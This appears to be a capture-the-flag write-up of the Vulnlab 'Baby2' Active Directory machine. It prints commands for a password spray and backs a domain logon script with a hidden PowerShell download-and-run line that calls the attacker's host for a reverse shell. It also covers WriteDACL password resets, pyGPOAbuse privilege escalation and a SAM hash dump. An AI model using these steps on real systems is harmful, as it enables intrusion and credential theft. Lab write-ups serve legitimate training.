---
title: Vulnlab - Baby2
date: 2025-01-13 02:30:00 +/-TTTT
categories: [VulnLab]
tags: [malicious-vbs, writeDACL, pyGPOAbuse]     # TAG names should always be lowercase
---
![img-description](/assets/images/baby2_slide.png)

## enum

    ➜  baby2 nxc smb 10.10.111.91
    SMB         10.10.111.91    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:False)

### shares

    ➜  baby2 nxc smb DC -u 'guest' -p '' --shares
    SMB         10.10.111.91    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:False)
    SMB         10.10.111.91    445    DC               [+] baby2.vl\guest:
    SMB         10.10.111.91    445    DC               [*] Enumerated shares
    SMB         10.10.111.91    445    DC               Share           Permissions     Remark
    SMB         10.10.111.91    445    DC               -----           -----------     ------
    SMB         10.10.111.91    445    DC               ADMIN$                          Remote Admin
    SMB         10.10.111.91    445    DC               apps            READ

    SMB         10.10.111.91    445    DC               C$                              Default share
    SMB         10.10.111.91    445    DC               docs

    SMB         10.10.111.91    445    DC               homes           READ,WRITE

    SMB         10.10.111.91    445    DC               IPC$            READ            Remote IPC
    SMB         10.10.111.91    445    DC               NETLOGON        READ            Logon server share

    SMB         10.10.111.91    445    DC               SYSVOL

we have READ,WRITE permissions for homes shares.

#### homes

    ➜  baby2 smbclient \\\\DC\\homes

    Password for [WORKGROUP\root]:
    Try "help" to get a list of possible commands.
    smb: \> ls
    .                                   D        0  Sun Jan 12 15:58:45 2025
    ..                                  D        0  Tue Aug 22 16:10:21 2023
    Amelia.Griffiths                    D        0  Tue Aug 22 16:17:06 2023
    Carl.Moore                          D        0  Tue Aug 22 16:17:06 2023
    Harry.Shaw                          D        0  Tue Aug 22 16:17:06 2023
    Joan.Jennings                       D        0  Tue Aug 22 16:17:06 2023
    Joel.Hurst                          D        0  Tue Aug 22 16:17:06 2023
    Kieran.Mitchell                     D        0  Tue Aug 22 16:17:06 2023
    library                             D        0  Tue Aug 22 16:22:47 2023
    Lynda.Bailey                        D        0  Tue Aug 22 16:17:06 2023
    Mohammed.Harris                     D        0  Tue Aug 22 16:17:06 2023
    Nicola.Lamb                         D        0  Tue Aug 22 16:17:06 2023
    Ryan.Jenkins                        D        0  Tue Aug 22 16:17:06 2023

users list

    ➜  baby2 cat smb-users.txt | awk '{print $1}'
    Amelia.Griffiths
    Carl.Moore
    Harry.Shaw
    Joan.Jennings
    Joel.Hurst
    Kieran.Mitchell
    library
    Lynda.Bailey
    Mohammed.Harris
    Nicola.Lamb
    Ryan.Jenkins
    ➜  baby2 cat smb-users.txt | awk '{print $1}' > users.txt

### username-spray

    ➜  baby2 nxc smb DC -u users.txt -p users.txt --continue-on-success --no-bruteforce
    SMB         10.10.111.91    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:False)
    SMB         10.10.111.91    445    DC               [-] baby2.vl\Amelia.Griffiths:Amelia.Griffiths STATUS_LOGON_FAILURE
    SMB         10.10.111.91    445    DC               [+] baby2.vl\Carl.Moore:Carl.Moore 
    SMB         10.10.111.91    445    DC               [-] baby2.vl\Harry.Shaw:Harry.Shaw STATUS_LOGON_FAILURE
    SMB         10.10.111.91    445    DC               [-] baby2.vl\Joan.Jennings:Joan.Jennings STATUS_LOGON_FAILURE
    SMB         10.10.111.91    445    DC               [-] baby2.vl\Joel.Hurst:Joel.Hurst STATUS_LOGON_FAILURE
    SMB         10.10.111.91    445    DC               [-] baby2.vl\Kieran.Mitchell:Kieran.Mitchell STATUS_LOGON_FAILURE
    SMB         10.10.111.91    445    DC               [+] baby2.vl\library:library 
    SMB         10.10.111.91    445    DC               [-] baby2.vl\Lynda.Bailey:Lynda.Bailey STATUS_LOGON_FAILURE
    SMB         10.10.111.91    445    DC               [-] baby2.vl\Mohammed.Harris:Mohammed.Harris STATUS_LOGON_FAILURE
    SMB         10.10.111.91    445    DC               [-] baby2.vl\Nicola.Lamb:Nicola.Lamb STATUS_LOGON_FAILURE
    SMB         10.10.111.91    445    DC               [-] baby2.vl\Ryan.Jenkins:Ryan.Jenkins STATUS_LOGON_FAILURE

so we got 2 creds so lets continue with Carl.Moore:Carl.Moore 

    ➜  baby2 nxc smb DC -u Carl.Moore -p 'Carl.Moore' --shares
    SMB         10.10.111.91    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:False)
    SMB         10.10.111.91    445    DC               [+] baby2.vl\Carl.Moore:Carl.Moore 
    SMB         10.10.111.91    445    DC               [*] Enumerated shares
    SMB         10.10.111.91    445    DC               Share           Permissions     Remark
    SMB         10.10.111.91    445    DC               -----           -----------     ------
    SMB         10.10.111.91    445    DC               ADMIN$                          Remote Admin
    SMB         10.10.111.91    445    DC               apps            READ,WRITE      
    SMB         10.10.111.91    445    DC               C$                              Default share
    SMB         10.10.111.91    445    DC               docs            READ,WRITE      
    SMB         10.10.111.91    445    DC               homes           READ,WRITE      
    SMB         10.10.111.91    445    DC               IPC$            READ            Remote IPC
    SMB         10.10.111.91    445    DC               NETLOGON        READ            Logon server share
    SMB         10.10.111.91    445    DC               SYSVOL          READ            Logon server share 

now we have READ, WRITE permissions for more shares.

## bloodhound

    ➜  bloodhound bloodhound-python -c ALL -u 'Carl.Moore' -p 'Carl.Moore' -d baby2.vl -ns 10.10.111.91   

    INFO: Found AD domain: baby2.vl
    INFO: Getting TGT for user
    WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.baby2.vl:88)] [Errno -2] Name or service not known
    INFO: Connecting to LDAP server: dc.baby2.vl
    INFO: Found 1 domains
    INFO: Found 1 domains in the forest
    INFO: Found 1 computers
    INFO: Connecting to LDAP server: dc.baby2.vl
    INFO: Found 16 users
    INFO: Found 54 groups
    INFO: Found 2 gpos
    INFO: Found 3 ous
    INFO: Found 19 containers
    INFO: Found 0 trusts
    INFO: Starting computer enumeration with 10 workers
    INFO: Querying computer: dc.baby2.vl
    INFO: Done in 00M 23S

![img-description](/assets/images/111.png)

we can see its about login.vbs so we can try to change login.vbs while we have READ,WRITE access

    ➜  baby2 smbclient \\\\DC\\NETLOGON -U Carl.Moore
    Password for [WORKGROUP\Carl.Moore]:
    Try "help" to get a list of possible commands.
    smb: \> dir
    .                                   D        0  Tue Aug 22 15:28:27 2023
    ..                                  D        0  Tue Aug 22 13:43:55 2023
    login.vbs                           A      992  Sat Sep  2 10:55:51 2023

we just add our malicious code at finish


    CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://10.8.2.152/a.ps1')"
    MapNetworkShare "\\dc.baby2.vl\apps", "V"
    MapNetworkShare "\\dc.baby2.vl\docs", "L"
    
now its changed size for example

    smb: \baby2.vl\scripts\> dir
    .                                   D        0  Tue Aug 22 15:28:27 2023
    ..                                  D        0  Tue Aug 22 13:43:55 2023
    login.vbs                           A      992  Sat Sep  2 10:55:51 2023

                    6126847 blocks of size 4096. 2017598 blocks available
    smb: \baby2.vl\scripts\> put login.vbs
    putting file login.vbs as \baby2.vl\scripts\login.vbs (2.4 kb/s) (average 2.4 kb/s)
    smb: \baby2.vl\scripts\> dir
    .                                   D        0  Tue Aug 22 15:28:27 2023
    ..                                  D        0  Tue Aug 22 13:43:55 2023
    login.vbs                           A     1226  Sun Jan 12 16:29:02 2025

## reverse-shell

    ➜  baby2 python3 -m http.server 80

    Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
    10.10.111.91 - - [12/Jan/2025 16:44:28] "GET /a.ps1 HTTP/1.1" 200 -

    ➜  baby2 nc -nvlp 443
    listening on [any] 443 ...
    connect to [10.8.2.152] from (UNKNOWN) [10.10.111.91] 49628
    whoami
    baby2\amelia.griffiths
we got our first shell so look at BHCE 

## WriteDACL

![img-description](/assets/images/22.png)

Windows Abuse:

    custom_prompt> . .\PowerView.ps1
    custom_prompt> add-domainobjectacl -rights "all" -targetidentity "gpoadm" -principalidentity "Amelia.Griffiths"
    custom_prompt> $cred = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
    custom_prompt> set-domainuserpassword gpoadm -accountpassword $cred
verify

    ➜  baby2 nxc smb DC -u gpoadm -p 'Password123!'         
    SMB         10.10.111.91    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:False)
    SMB         10.10.111.91    445    DC               [+] baby2.vl\gpoadm:Password123! 

## gpoabuse

![img-description](/assets/images/4.png)

    Gpcpath:
    \\BABY2.VL\SYSVOL\BABY2.VL\POLICIES\{31B2F340-016D-11D2-945F-00C04FB984F9}

https://github.com/Hackndo/pyGPOAbuse

    ➜  pyGPOAbuse git:(master) python3 pygpoabuse.py baby2.vl/GPOADM:'Password123!' -gpo-id "31B2F340-016D-11D2-945F-00C04FB984F9" -command 'net localgroup administrators GPOADM /add' -f
    SUCCESS:root:ScheduledTask TASK_93305dc2 created!
    [+] ScheduledTask TASK_93305dc2 created!

verify

    custom_prompt> net user gpoadm
    User name                    gpoadm
    Full Name                    gpoadm
    Comment                      
    User's comment               
    Country/region code          000 (System Default)
    Account active               Yes
    Account expires              Never

    Password last set            1/12/2025 2:04:36 PM
    Password expires             Never
    Password changeable          1/13/2025 2:04:36 PM
    Password required            Yes
    User may change password     Yes

    Workstations allowed         All
    Logon script                 
    User profile                 
    Home directory               
    Last logon                   1/12/2025 2:13:11 PM

    Logon hours allowed          All

    Local Group Memberships      *Administrators       
    Global Group memberships     *Domain Users         
    The command completed successfully.

### secretsdump

    ➜  baby2 impacket-secretsdump 'gpoadm:Password123!@10.10.111.91'
    Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

    [*] Service RemoteRegistry is in stopped state
    [*] Starting service RemoteRegistry
    [*] Target system bootKey: 0x34170b414576a40142e3edc4911d859d
    [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:<redacted>:::
    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    [-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.

